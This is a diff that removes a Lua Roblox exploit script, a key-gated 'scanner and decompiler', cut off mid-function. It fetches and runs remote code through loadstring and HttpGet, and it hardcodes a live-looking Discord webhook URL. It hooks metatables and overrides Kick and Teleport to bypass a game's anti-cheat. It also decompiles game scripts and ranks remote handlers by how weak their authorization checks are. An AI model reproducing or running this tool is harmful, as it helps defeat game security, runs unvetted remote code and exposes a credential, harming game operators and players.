@@ -1,1839 +1,1349 @@
--- ============================================================
---          ADVANCED SCANNER & DECOMPILER v4.0
---          Cross-Reference + Full Bypass + Auto Kick Toggle
---          Guide: https://discord.gg/UBeBEhxUgQ
--- ============================================================
-
-local CORRECT_KEY = "madebychayoo077"
-local DISCORD_LINK = "https://discord.gg/UBeBEhxUgQ"
-local _KEY_AUTHORIZED = false
-local _keyGui = nil
-
-do
-    local g = Instance.new("ScreenGui"); g.Name = "DHKey"; g.ResetOnSpawn = false; g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    _keyGui = g
-    local okParent, _ = pcall(function() g.Parent = game:GetService("CoreGui") end)
-    if not okParent then
-        local plr = game:GetService("Players").LocalPlayer
-        if plr then pcall(function() g.Parent = plr:WaitForChild("PlayerGui") end) end
-    end
-
-    -- ana panel (2007 tarzı)
-    local f = Instance.new("Frame")
-    f.Size = UDim2.new(0, 380, 0, 260)
-    f.Position = UDim2.new(0.5, -190, 0.5, -130)
-    f.BackgroundColor3 = Color3.fromRGB(55, 40, 25)
-    f.BackgroundTransparency = 0
-    f.BorderSizePixel = 4; f.BorderColor3 = Color3.fromRGB(200, 145, 50)
-    f.ClipsDescendants = true; f.Parent = g
-
-    -- panel içi arka plan
-    local bg = Instance.new("Frame"); bg.Size = UDim2.new(1, 0, 1, 0); bg.BackgroundColor3 = Color3.fromRGB(35, 22, 12); bg.BorderSizePixel = 0; bg.ZIndex = 0; bg.Parent = f
-
-    -- 2007 tarzı tuğla yağmuru
-    local BRICK_COLORS = {
-        Color3.fromRGB(245, 205, 47),  -- bright yellow
-        Color3.fromRGB(196, 40, 28),   -- bright red
-        Color3.fromRGB(13, 105, 172),  -- bright blue
-        Color3.fromRGB(75, 151, 75),   -- bright green
-        Color3.fromRGB(196, 112, 28),  -- bright orange
-        Color3.fromRGB(160, 80, 160),  -- bright violet
-        Color3.fromRGB(180, 165, 135), -- light stone
-        Color3.fromRGB(217, 165, 89),  -- brass
-        Color3.fromRGB(102, 153, 153), -- teal
-    }
-    local STUDS = 55; local studs = {}; local rs = game:GetService("RunService")
-    local function makeStud(c)
-        local g = Instance.new("Frame"); g.Size = UDim2.new(0, 1, 0, 1); g.BackgroundTransparency = 1; g.BorderSizePixel = 0
-        local body = Instance.new("Frame"); body.Size = UDim2.new(1, 0, 0.7, 0); body.Position = UDim2.new(0, 0, 0.3, 0)
-        body.BackgroundColor3 = c; body.BorderSizePixel = 1; body.BorderColor3 = Color3.fromRGB(25, 25, 25); body.Parent = g
-        local bump = Instance.new("Frame"); bump.Size = UDim2.new(0.55, 0, 0.35, 0); bump.Position = UDim2.new(0.225, 0, 0, 0)
-        bump.BackgroundColor3 = Color3.fromRGB(math.min(255, c.R * 255 + 35), math.min(255, c.G * 255 + 30), math.min(255, c.B * 255 + 25)); bump.BorderSizePixel = 1; bump.BorderColor3 = Color3.fromRGB(25, 25, 25); bump.Parent = g
-        local sh = Instance.new("Frame"); sh.Size = UDim2.new(0.5, 0, 0, 1); sh.Position = UDim2.new(0.25, 0, 0.3, 0); sh.BackgroundColor3 = Color3.fromRGB(15, 15, 15); sh.BackgroundTransparency = 0.3; sh.BorderSizePixel = 0; sh.Parent = g
-        return g
-    end
-    for i = 1, STUDS do
-        local col = BRICK_COLORS[math.random(#BRICK_COLORS)]
-        local s = makeStud(col)
-        local sc = 6 + math.random() * 8
-        s.Size = UDim2.new(0, math.floor(sc * 1.3 + 0.5), 0, math.floor(sc + 0.5))
-        s.Position = UDim2.new(math.random() * 0.94 + 0.03, 0, -0.05 - math.random() * 1.5, 0)
-        local t = math.random(0, 3) / 10
-        local kids = s:GetChildren()
-        for _, k in ipairs(kids) do
-            if k:IsA("Frame") then k.BackgroundTransparency = math.min(1, k.BackgroundTransparency + t); k.BorderColor3 = Color3.fromRGB(20, 20, 20) end
-        end
-        s.ZIndex = 0; s.Parent = f
-        studs[i] = { f = s, spd = math.random(20, 120) / 100, sway = (math.random() - 0.5) * 0.25, phase = math.random() * 6.28 }
-    end
-    local conn; conn = rs.RenderStepped:Connect(function(dt)
-        for _, v in ipairs(studs) do
-            local pos = v.f.Position
-            local ny = pos.Y.Scale + v.spd * dt * 0.5
-            local nx = pos.X.Scale + math.sin(v.phase + tick() * 0.5) * 0.0005 + v.sway * dt * 0.015
-            if nx < 0 then nx = nx + 1 elseif nx > 1 then nx = nx - 1 end
-            v.f.Position = UDim2.new(nx, 0, ny > 1.1 and -0.05 - math.random() * 1.0 or ny, 0)
-        end
-    end)
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, -40, 0, 30); title.Position = UDim2.new(0, 20, 0, 8)
-    title.Text = "> DECOMPILER v4.0 <"; title.TextColor3 = Color3.fromRGB(230, 180, 50)
-    title.Font = Enum.Font.Code; title.TextSize = 18; title.BackgroundTransparency = 1; title.ZIndex = 2
-
-    local sub = Instance.new("TextLabel")
-    sub.Size = UDim2.new(0, 200, 0, 18); sub.Position = UDim2.new(0.5, -100, 0, 54)
-    sub.Text = "ENTER KEY TO UNLOCK"; sub.TextColor3 = Color3.fromRGB(180, 140, 40)
-    sub.Font = Enum.Font.Code; sub.TextSize = 11; sub.BackgroundTransparency = 1; sub.ZIndex = 2
-
-    local box = Instance.new("TextBox")
-    box.Size = UDim2.new(0, 240, 0, 30); box.Position = UDim2.new(0.5, -120, 0, 76)
-    box.PlaceholderText = "key"; box.Text = ""
-    box.TextColor3 = Color3.fromRGB(240, 200, 70); box.PlaceholderColor3 = Color3.fromRGB(90, 65, 30)
-    box.Font = Enum.Font.Code; box.TextSize = 14; box.ClearTextOnFocus = false
-    box.BackgroundColor3 = Color3.fromRGB(40, 28, 15); box.ZIndex = 2
-    box.BorderSizePixel = 2; box.BorderColor3 = Color3.fromRGB(200, 145, 50)
-
-    local stat = Instance.new("TextLabel")
-    stat.Size = UDim2.new(1, 0, 0, 16); stat.Position = UDim2.new(0, 0, 0, 110)
-    stat.Text = ""; stat.TextColor3 = Color3.fromRGB(220, 80, 60)
-    stat.Font = Enum.Font.Code; stat.TextSize = 10; stat.BackgroundTransparency = 1; stat.ZIndex = 2
-
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0, 120, 0, 30); btn.Position = UDim2.new(0.5, -60, 0, 130)
-    btn.Text = "> UNLOCK <"; btn.TextColor3 = Color3.fromRGB(240, 200, 60)
-    btn.Font = Enum.Font.Code; btn.TextSize = 13; btn.ZIndex = 2
-    btn.BackgroundColor3 = Color3.fromRGB(60, 42, 22)
-    btn.BorderSizePixel = 2; btn.BorderColor3 = Color3.fromRGB(200, 145, 50)
-
-    local dc = Instance.new("TextButton")
-    dc.Size = UDim2.new(0, 160, 0, 26); dc.Position = UDim2.new(0.5, -80, 0, 170)
-    dc.Text = "> DISCORD <"; dc.TextColor3 = Color3.fromRGB(120, 160, 220)
-    dc.Font = Enum.Font.Code; dc.TextSize = 11; dc.ZIndex = 2
-    dc.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
-    dc.BorderSizePixel = 2; dc.BorderColor3 = Color3.fromRGB(60, 80, 150)
-
-    -- dönen ipucu
-    local tip = Instance.new("TextLabel")
-    tip.Size = UDim2.new(1, -10, 0, 14); tip.Position = UDim2.new(0, 5, 0, 202)
-    tip.Text = ""; tip.TextColor3 = Color3.fromRGB(100, 80, 50)
-    tip.Font = Enum.Font.Code; tip.TextSize = 9; tip.BackgroundTransparency = 1; tip.ZIndex = 2
-    local tips = { "discord.gg/UBeBEhxUgQ", "scans all scripts", "bypass shield included" }
-    local ti = 0; local tipCon
-    tipCon = game:GetService("RunService").Stepped:Connect(function()
-        ti = ti + 0.02; tip.Text = tips[math.floor(ti % #tips) + 1]
-    end)
-
-    local footer = Instance.new("TextLabel")
-    footer.Size = UDim2.new(1, 0, 0, 16); footer.Position = UDim2.new(0, 0, 1, -16)
-    footer.Text = "made by chayoo"; footer.TextColor3 = Color3.fromRGB(70, 55, 35)
-    footer.Font = Enum.Font.Code; footer.TextSize = 9; footer.BackgroundTransparency = 1; footer.ZIndex = 2
-
-    title.Parent = f; sub.Parent = f; box.Parent = f; stat.Parent = f; btn.Parent = f; dc.Parent = f; tip.Parent = f; footer.Parent = f
-
-    local function copyDiscord()
-        local c = (typeof(setclipboard)=="function" and setclipboard) or (typeof(clipboard)=="function" and clipboard) or (typeof(toclipboard)=="function" and toclipboard)
-        if c then pcall(c, DISCORD_LINK); stat.Text = "Copied!"; stat.TextColor3 = Color3.fromRGB(0, 200, 0)
-        else stat.Text = "Unsupported"; stat.TextColor3 = Color3.fromRGB(255, 200, 0) end
-    end
-
-    local unlocked = false
-    local wrongAttempts = 0
-    btn.MouseButton1Click:Connect(function()
-        if unlocked then return end
-        if box.Text == CORRECT_KEY then
-            unlocked = true; _KEY_AUTHORIZED = true
-            stat.Text = "ACCESS GRANTED"; stat.TextColor3 = Color3.fromRGB(0, 255, 0)
-            btn.BackgroundTransparency = 0.5; btn.TextTransparency = 0.5; btn.BorderColor3 = Color3.fromRGB(100, 70, 20)
-            if conn then conn:Disconnect() end
-            if tipCon then tipCon:Disconnect() end
-            task.spawn(function()
-                local bw = 380
-                local block = Instance.new("Frame"); block.Size = UDim2.new(0, 0, 0, 260); block.Position = UDim2.new(0.5, 190, 0.5, -130); block.BackgroundColor3 = Color3.fromRGB(245, 245, 255); block.BackgroundTransparency = 0.1; block.BorderSizePixel = 0; block.ZIndex = 11; block.Parent = g
-                local edge = Instance.new("Frame"); edge.Size = UDim2.new(0, 4, 1, 0); edge.Position = UDim2.new(0, 0, 0, 0); edge.BackgroundColor3 = Color3.fromRGB(180, 230, 255); edge.BackgroundTransparency = 0.05; edge.BorderSizePixel = 0; edge.ZIndex = 12; edge.Parent = block
-                local edgeGlow = Instance.new("Frame"); edgeGlow.Size = UDim2.new(0, 14, 1, 0); edgeGlow.Position = UDim2.new(0, -14, 0, 0); edgeGlow.BackgroundColor3 = Color3.fromRGB(200, 240, 255); edgeGlow.BackgroundTransparency = 0.5; edgeGlow.BorderSizePixel = 0; edgeGlow.ZIndex = 10; edgeGlow.Parent = block
-                local extGlow = Instance.new("Frame"); extGlow.Size = UDim2.new(0, 0, 0, 310); extGlow.Position = UDim2.new(0.5, 190, 0.5, -155); extGlow.BackgroundColor3 = Color3.fromRGB(150, 200, 255); extGlow.BackgroundTransparency = 0.75; extGlow.BorderSizePixel = 0; extGlow.ZIndex = 9; extGlow.Parent = g
-                local startT = tick()
-                local total = 0.85
-                local rs = game:GetService("RunService").RenderStepped
-                local conn2; conn2 = rs:Connect(function()
-                    local t = math.min(1, (tick() - startT) / total)
-                    local s = t < 0.5 and 2 * t * t or 1 - (-2 * t + 2)^2 / 2
-                    local w, ox, blockT, extT, edgeT, edgeGT, c
-                    if s <= 0.65 then
-                        local p = s / 0.65
-                        local ps = p < 0.5 and 2 * p * p or 1 - (-2 * p + 2)^2 / 2
-                        w = ps * bw
-                        ox = 190 - w
-                        blockT = 0.1
-                        edgeT = 0.05
-                        edgeGT = 0.5
-                        extT = 0.75
-                        c = ps
-                    else
-                        local p = (s - 0.65) / 0.35
-                        local ps = 1 - (1 - p)^3
-                        w = bw
-                        ox = -190 - 300 * ps
-                        blockT = 0.1 + ps * 0.8
-                        edgeT = 0.05 + ps * 0.9
-                        edgeGT = 0.5 + ps * 0.45
-                        extT = 0.75 + ps * 0.2
-                        c = 1
-                    end
-                    block.Size = UDim2.new(0, w, 0, 260)
-                    block.Position = UDim2.new(0.5, ox, 0.5, -130)
-                    block.BackgroundTransparency = blockT
-                    edge.BackgroundTransparency = edgeT
-                    edgeGlow.BackgroundTransparency = edgeGT
-                    extGlow.Size = UDim2.new(0, w + 40, 0, 310)
-                    extGlow.Position = UDim2.new(0.5, ox - 20, 0.5, -155)
-                    extGlow.BackgroundTransparency = extT
-                    f.BackgroundTransparency = 0.1 + math.min(1, c) * 0.85
-                    f.BorderSizePixel = math.floor(4 * (1 - math.min(1, c)))
-                    if t >= 1 then
-                        conn2:Disconnect()
-                        g:Destroy()
-                    end
-                end)
-            end)
-        else
-            wrongAttempts = wrongAttempts + 1
-            if wrongAttempts >= 3 then
-                local msg = "ACCESS DENIED - Invalid Key!\nJoin our Discord for a valid key:\ndiscord.gg/UBeBEhxUgQ"
-                pcall(function() game:GetService("Players").LocalPlayer:Kick(msg) end)
-                return
-            end
-            stat.Text = "INVALID KEY (" .. (3 - wrongAttempts) .. " tries left)"; stat.TextColor3 = Color3.fromRGB(255, 80, 80)
-            box.Text = ""
-        end
-    end)
-
-    dc.MouseButton1Click:Connect(copyDiscord)
-    box.Focused:Connect(function() box.BorderColor3 = Color3.fromRGB(0, 230, 0) end)
-    box.FocusLost:Connect(function(enter) box.BorderColor3 = Color3.fromRGB(0, 170, 0); if enter then btn.MouseButton1Click:Fire() end end)
-end
-while not _KEY_AUTHORIZED do task.wait(1) end
-pcall(function() if _keyGui then _keyGui:Destroy() end end)
-
-local Rayfield
-do
-    local ok, res = pcall(loadstring, game:HttpGet("https://sirius.menu/rayfield"))
-    if not ok or not res then
-        local f = Instance.new("ScreenGui"); f.Name = "DHErr"; pcall(function() f.Parent = game:GetService("CoreGui") end)
-        local t = Instance.new("TextLabel"); t.Size = UDim2.new(1,0,1,0); t.Text = "Rayfield failed to load!"; t.TextColor3 = Color3.fromRGB(255,80,80); t.Font = Enum.Font.Code; t.TextSize = 18; t.BackgroundTransparency = 1; t.Parent = f
-        return
-    end
-    Rayfield = res()
-end
-
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local LP = Players.LocalPlayer
-
-local _decompile = (typeof(decompile)=="function" and decompile) or (typeof(Decompile)=="function" and Decompile) or nil
-local _getbytecode = (typeof(getscriptbytecode)=="function" and getscriptbytecode) or nil
-local _setclipboard = (typeof(setclipboard)=="function" and setclipboard) or (typeof(clipboard)=="function" and clipboard) or (typeof(toclipboard)=="function" and toclipboard) or nil
-
-local _request = (typeof(request)=="function" and request) or (typeof(syn)=="table" and typeof(syn.request)=="function" and syn.request) or (typeof(http)=="table" and typeof(http.request)=="function" and http.request) or (typeof(http_request)=="function" and http_request) or nil
-local WEBHOOK_SECRET = "https://discord.com/api/webhooks/1515758298375258143/qEOiy7WSE2kJGr0PFO82Nlezg-X8LAtP9cmWvWw_eEJWCJ61RxsJ2KSs3IlSO8xQBija"
-
-local SCRIPT_CLASSES = { LocalScript=true, Script=true, ModuleScript=true }
-local REMOTE_CLASSES = { RemoteEvent=true, RemoteFunction=true, BindableEvent=true, BindableFunction=true }
-local PART_CLASSES = { Part=true, MeshPart=true, UnionOperation=true }
-
-local ROBLOX_INTERNAL_KEYWORDS = {
-    CorePackages = true, CoreGui = true, CoreScripts = true,
-    RobloxGui = true, RobloxPlugin = true,
-}
-
-local function isRobloxInternal(inst)
-    local p = inst.Parent
-    while p and p ~= game do
-        if ROBLOX_INTERNAL_KEYWORDS[p.Name] then return true end
-        p = p.Parent
-    end
-    return false
-end
-
-
-
--- ============================================================
--- BYPASS / SHIELD MODULE
--- ============================================================
-local shieldActive = false
-local shieldHooks = {}
-local origKick = nil
-local function enableShield()
-    if shieldActive then return end
-    local function safeHook() end
-    local ok, r = pcall(function()
-        local ps = game:GetService("Players")
-        local lp = ps.LocalPlayer
-
-        -- 1) Kick/kick override on LocalPlayer (save originals)
-        if lp then
-            origKick = lp.Kick
-            if lp.Kick then lp.Kick = function() return end end
-            if lp.kick then lp.kick = function() return end end
-        end
-        ps.PlayerAdded:Connect(function(plr)
-            if plr == lp then
-                if not origKick then origKick = plr.Kick end
-                if plr.Kick then plr.Kick = function() return end end
-                if plr.kick then plr.kick = function() return end end
-            end
-        end)
-
-        -- 2) __namecall hook on Players service
-        local psMT = getrawmetatable and getrawmetatable(ps)
-        if psMT then
-            local oldNC = psMT.__namecall
-            if oldNC then
-                psMT.__namecall = function(self, ...)
-                    local m = getnamecallmethod and getnamecallmethod()
-                    if m then
-                        local lm = m:lower()
-                        if lm == "kick" then return nil end
-                        if lm == "loadstring" then return nil end
-                    end
-                    return oldNC(self, ...)
-                end
-                shieldHooks[#shieldHooks+1] = function() psMT.__namecall = oldNC end
-            end
-        end
-
-        -- 3) __namecall hook on game for Teleport
-        local gameMT = getrawmetatable and getrawmetatable(game)
-        if gameMT then
-            local oldGNC = gameMT.__namecall
-            if oldGNC then
-                gameMT.__namecall = function(self, ...)
-                    local m = getnamecallmethod and getnamecallmethod()
-                    if m then
-                        local lm = m:lower()
-                        if lm == "teleport" or lm == "teleporttoplaceinstance" then return nil end
-                    end
-                    return oldGNC(self, ...)
-                end
-                shieldHooks[#shieldHooks+1] = function() gameMT.__namecall = oldGNC end
-            end
-        end
-
-        -- 4) Anti-freeze: keep character animateable
-        local char = lp and lp.Character
-        if char then
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            if hrp and hrp:FindFirstChildOfClass("BodyPosition") then hrp.BodyPosition:Destroy() end
-            if hrp and hrp:FindFirstChildOfClass("BodyVelocity") then hrp.BodyVelocity:Destroy() end
-        end
-        lp.CharacterAdded:Connect(function(c)
-            task.wait(0.5)
-            local hrp = c:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                for _, b in ipairs(hrp:GetChildren()) do
-                    if b:IsA("BodyPosition") or b:IsA("BodyVelocity") then b:Destroy() end
-                end
-            end
-        end)
-    end)
-    shieldActive = ok and r ~= false
-end
-
-local function disableShield()
-    for _, fn in ipairs(shieldHooks) do pcall(fn) end
-    shieldHooks = {}
-    shieldActive = false
-end
-
-local autoKickEnabled = true
-local scanAborted = false
-
-local function getGameName()
-    local gn = ""
-    pcall(function()
-        local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-        if info and info.Name and #info.Name > 0 then gn = info.Name:sub(1,80) end
-    end)
-    if #gn == 0 then pcall(function() gn = tostring(game.Name):sub(1,80) end) end
-    if #gn == 0 then gn = "Game" end
-    return gn
-end
-
-local function fullPath(inst)
-    local ok, res = pcall(function()
-        local p = {}; local c = inst
-        while c and c ~= game do p[#p+1] = c.Name; c = c.Parent end
-        local n = #p
-        for i = 1, math.floor(n/2) do p[i], p[n-i+1] = p[n-i+1], p[i] end
-        return "game." .. table.concat(p, ".")
-    end)
-    return ok and res or tostring(inst)
-end
-
-local function trunc(s, m)
-    s = tostring(s)
-    return #s > m and s:sub(1, m) .. "..." or s
-end
-
-local function tryDecompile(inst)
-    if _decompile then local o, s = pcall(_decompile, inst); if o and type(s) == "string" and #s > 0 then return "decompile()", s end end
-    if inst.ClassName ~= "ModuleScript" and _getbytecode then local o, s = pcall(_getbytecode, inst); if o and type(s) == "string" and #s > 0 then return "bytecode", s end end
-    local o, s = pcall(function() return inst.Source end)
-    if o and type(s) == "string" and #s > 0 then return "direct_source", s end
-    return nil, nil
-end
-
-local function extractRemoteCalls(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    pcall(function()
-        for call, fargs in src:gmatch("([%w_%.]+):FireServer%b()") do
-            local args = fargs:match("^%((.*)%)$") or ""
-            local ac = 0; for _ in args:gmatch("[^,]+") do ac = ac + 1 end
-            r[#r+1] = { type = "FireServer", remote = call, args = ac, argsStr = trunc(args, 80) }
-        end
-    end)
-    pcall(function()
-        for call, fargs in src:gmatch("([%w_%.]+):InvokeServer%b()") do
-            local args = fargs:match("^%((.*)%)$") or ""
-            local ac = 0; for _ in args:gmatch("[^,]+") do ac = ac + 1 end
-            r[#r+1] = { type = "InvokeServer", remote = call, args = ac, argsStr = trunc(args, 80) }
-        end
-    end)
-    pcall(function()
-        for call, fargs in src:gmatch("([%w_%.]+):Fire%b()") do
-            if not call:find("Server") then
-                local args = fargs:match("^%((.*)%)$") or ""
-                local ac = 0; for _ in args:gmatch("[^,]+") do ac = ac + 1 end
-                r[#r+1] = { type = "Fire", remote = call, args = ac, argsStr = trunc(args, 80) }
-            end
-        end
-    end)
-    return r
-end
-
-local function extractRequires(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    pcall(function()
-        for requireCall in src:gmatch("require%([^)]+%)") do
-            local inner = requireCall:match("require%((.*)%)$")
-            if inner then r[inner] = true end
-        end
-    end)
-    pcall(function()
-        for w in src:gmatch("WaitForChild%(\"([^\"]+)\"%)") do r[w] = true end
-    end)
-    pcall(function()
-        for w in src:gmatch("WaitForChild%(['])([^'\"]+)[']%)") do r[w] = true end
-    end)
-    pcall(function()
-        for mod, child in src:gmatch("([%w_]+):WaitForChild%(\"([^\"]+)\"%)") do
-            r[mod .. ":" .. child] = true
-        end
-    end)
-    pcall(function()
-        for svc, mod in src:gmatch("game:GetService%(\"([^\"]+)\"%):WaitForChild%(\"([^\"]+)\"%)") do
-            r["game." .. svc .. ":" .. mod] = true
-        end
-    end)
-    pcall(function()
-        for svc, mod in src:gmatch("game%.([%w_]+):WaitForChild%(\"([^\"]+)\"%)") do
-            r["game." .. svc .. ":" .. mod] = true
-        end
-    end)
-    pcall(function()
-        for load, mod in src:gmatch("([%w_]+)%[([\"'])([^\"']+)\2%]") do
-            local lowered = mod:lower()
-            if lowered:find("module") or lowered:find("script") or lowered:find("require") then
-                r[mod] = true
-            end
-        end
-    end)
-    return r
-end
-
-local function extractTags(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    pcall(function() for tag in src:gmatch('[Aa]ddTag%("([^"]*)"%)') do r[tag] = true end end)
-    pcall(function() for tag in src:gmatch('[Gg]etTagged%("([^"]*)"%)') do r[tag] = true end end)
-    pcall(function() for tag in src:gmatch('[Gg]etInstanceAddedSignal%("([^"]*)"%)') do r[tag] = true end end)
-    pcall(function() for tag in src:gmatch(':HasTag%("([^"]*)"%)') do r[tag] = true end end)
-    return r
-end
-
-local function extractRemoteCreation(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    pcall(function()
-        for var, rclass in src:gmatch("([%w_]+)%s*=%s*Instance%.new%(\"([^\"]+)\"%)") do
-            if rclass == "RemoteEvent" or rclass == "RemoteFunction" then
-                r[#r+1] = { var = var, class = rclass, type = "explicit" }
-            end
-        end
-    end)
-    pcall(function()
-        for var in src:gmatch("([%w_]+)%s*=%s*Instance%.new%(\"Remote%a+\"%)") do
-            r[#r+1] = { var = var, class = "Remote*", type = "explicit" }
-        end
-    end)
-    pcall(function()
-        local seen = {}
-        for rname in src:gmatch("Instance%.new%(\"Remote([%a]+)\"%)") do
-            if not seen[rname] then seen[rname] = true; r[#r+1] = { var = "Instance", class = "Remote"..rname, type = "anonymous" } end
-        end
-    end)
-    pcall(function()
-        for assign in src:gmatch("([%w_]+%.[%w_]+)%s*=%s*Instance%.new%(\"Remote%a+\"%)") do
-            r[#r+1] = { var = assign, class = "RemoteField", type = "field" }
-        end
-    end)
-    return r
-end
-
-local function extractDynamicRemotePatterns(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    pcall(function()
-        if src:find("_G%b[]") or src:find("shared%b[]") or src:find("getfenv") then
-            r.dynamicTable = true
-        end
-        for call, fargs in src:gmatch("([%w_]+):FireServer%b()") do
-            local args = fargs:match("^%((.*)%)$") or ""
-            if args:find("%.%.") or args:find("tostring") then
-                r.dynamicCall = true
-            end
-        end
-        for var, idx in src:gmatch("([%w_]+)%[([^%]]+)%]") do
-            local lowered = idx:lower()
-            if lowered:find("remote") or lowered:find("event") or lowered:find("function") then
-                r.indexedAccess = true
-            end
-        end
-        for _, rclass in ipairs({ "RemoteEvent", "RemoteFunction" }) do
-            for match in src:gmatch(rclass .. "%.new") do
-                r.constructorAccess = true
-            end
-        end
-    end)
-    return r
-end
-
-local function extractSharedVarAccess(src, path)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    pcall(function()
-        for var in src:gmatch("_G%.([%w_]+)") do
-            r[#r+1] = { var = var, type = "read" }
-        end
-        for var in src:gmatch("shared%.([%w_]+)") do
-            r[#r+1] = { var = var, type = "read" }
-        end
-        for key, val in src:gmatch("_G%[[\"']([%w_]+)[\"']%]%s*=%s*([^\n]+)") do
-            r[#r+1] = { var = key, snippet = trunc(val, 40), type = "write" }
-        end
-        for key, val in src:gmatch("shared%[[\"']([%w_]+)[\"']%]%s*=%s*([^\n]+)") do
-            r[#r+1] = { var = key, snippet = trunc(val, 40), type = "write" }
-        end
-    end)
-    return r
-end
-
-local function analyzeAuth(src)
-    local result = { score = 0, checks = {} }
-    if type(src) ~= "string" or #src == 0 then return result end
-    if src:find("UserId") then result.score = result.score + 2; result.checks[#result.checks+1] = "UserId" end
-    if src:find("typeof") then result.score = result.score + 1; result.checks[#result.checks+1] = "typeof" end
-    if src:find("IsA") then result.score = result.score + 1; result.checks[#result.checks+1] = "IsA" end
-    if src:find("Character") then result.score = result.score + 1; result.checks[#result.checks+1] = "Character" end
-    if src:find("GetPlayerFromCharacter") then result.score = result.score + 1; result.checks[#result.checks+1] = "GetPlayerFromCharacter" end
-    if src:find("Admin") or src:find("admin") then result.checks[#result.checks+1] = "AdminKeyword" end
-    if src:find("Owner") or src:find("owner") then result.checks[#result.checks+1] = "OwnerKeyword" end
-    if src:find("Ban") then result.checks[#result.checks+1] = "BanKeyword" end
-    return result
-end
-
-local function buildCrossReference(scripts)
-    local handlers = {}
-    local callerLookup = {}
-    for _, v in ipairs(scripts) do
-        if v.src and #v.src > 0 then
-            pcall(function()
-                for remoteName, params in v.src:gmatch("([%w_%.]+)%.OnServerEvent:Connect%(([^)]*)%)") do
-                    if not handlers[remoteName] then handlers[remoteName] = {} end
-                    handlers[remoteName][#handlers[remoteName]+1] = {
-                        scriptPath = v.path, handlerType = "OnServerEvent",
-                        params = trunc(params, 40), auth = analyzeAuth(v.src)
-                    }
-                end
-            end)
-            pcall(function()
-                for remoteName, params in v.src:gmatch("([%w_%.]+)%.Event:Connect%(([^)]*)%)") do
-                    if not handlers[remoteName] then handlers[remoteName] = {} end
-                    handlers[remoteName][#handlers[remoteName]+1] = {
-                        scriptPath = v.path, handlerType = "Event:Connect",
-                        params = trunc(params, 40), auth = analyzeAuth(v.src)
-                    }
-                end
-            end)
-            pcall(function()
-                for remoteName, params in v.src:gmatch("([%w_%.]+)%.OnInvoke:Connect%(([^)]*)%)") do
-                    if not handlers[remoteName] then handlers[remoteName] = {} end
-                    handlers[remoteName][#handlers[remoteName]+1] = {
-                        scriptPath = v.path, handlerType = "OnInvoke",
-                        params = trunc(params, 40), auth = analyzeAuth(v.src)
-                    }
-                end
-            end)
-        end
-    end
-    for _, v in ipairs(scripts) do
-        if v.remoteCalls then
-            for _, rc in ipairs(v.remoteCalls) do
-                local matchedHandlers = handlers[rc.remote]
-                if matchedHandlers then
-                    rc.handlers = matchedHandlers
-                    rc.maxAuth = 0
-                    for _, h in ipairs(matchedHandlers) do
-                        if h.auth.score > rc.maxAuth then rc.maxAuth = h.auth.score end
-                    end
-                    rc.hasAuth = rc.maxAuth >= 2
-                end
-                if not callerLookup[rc.remote] then callerLookup[rc.remote] = {} end
-                callerLookup[rc.remote][#callerLookup[rc.remote]+1] = {
-                    scriptPath = v.path, callType = rc.type, args = rc.args
-                }
-            end
-        end
-    end
-    for rname, hlist in pairs(handlers) do
-        for _, h in ipairs(hlist) do
-            h.callers = callerLookup[rname] or {}
-        end
-    end
-    return handlers
-end
-
-local function detectAntiCheat(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    if src:find("RemoteSpy") or src:find("remotespy") then r[#r+1] = { lvl = "HIGH", desc = "RemoteSpy detection" } end
-    if src:find("Kick%s*%(.*Player") or src:find("kick%s*%(.*Player") then r[#r+1] = { lvl = "HIGH", desc = "Kick on player check" } end
-    if src:find("whitelist") or src:find("WhiteList") or src:find("Whitelist") then r[#r+1] = { lvl = "MEDIUM", desc = "Whitelist check present" } end
-    if src:find("checkcaller") then r[#r+1] = { lvl = "CRITICAL", desc = "checkcaller anti-exploit" } end
-    if src:find("protectgui") or src:find("protect_instance") then r[#r+1] = { lvl = "MEDIUM", desc = "Executor protection calls" } end
-    if src:find("gethui") then r[#r+1] = { lvl = "LOW", desc = "gethui usage" } end
-    if src:find("HttpGet") and src:find("webhook") then r[#r+1] = { lvl = "HIGH", desc = "Webhook callback in code" } end
-    if src:find("__namecall") then r[#r+1] = { lvl = "CRITICAL", desc = "__namecall hook - remote detection" } end
-    if src:find("FireServer") and (src:find("Kick") or src:find("kick")) then r[#r+1] = { lvl = "CRITICAL", desc = "Remote call + Kick (anti-exploit)" } end
-    if src:find("syn%.") or src:find("syn_") then r[#r+1] = { lvl = "HIGH", desc = "Synapse API usage" } end
-    if src:find("identifyexecutor") or src:find("getexecutorname") then r[#r+1] = { lvl = "HIGH", desc = "Executor fingerprinting" } end
-    if src:find("getconnections") then r[#r+1] = { lvl = "HIGH", desc = "getconnections - signal inspection" } end
-    if src:find("getgc") then r[#r+1] = { lvl = "MEDIUM", desc = "getgc - GC inspection" } end
-    if src:find("is_script") or src:find("isscript") then r[#r+1] = { lvl = "MEDIUM", desc = "Script context detection" } end
-    if src:find("getscriptclosure") or src:find("getclosure") then r[#r+1] = { lvl = "MEDIUM", desc = "Closure extraction" } end
-    if src:find("getscriptbytecode") or src:find("getbytecode") then r[#r+1] = { lvl = "MEDIUM", desc = "Bytecode extraction" } end
-    if src:find("getscripthash") then r[#r+1] = { lvl = "LOW", desc = "Script hash checking" } end
-    if src:find("decompile") then r[#r+1] = { lvl = "MEDIUM", desc = "decompile call - anti-decompile" } end
-    return r
-end
-
-local function detectObfuscation(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    local bc = 0
-    for _ in src:gmatch("string%.byte") do bc = bc + 1 end
-    for _ in src:gmatch("string%.char") do bc = bc + 1 end
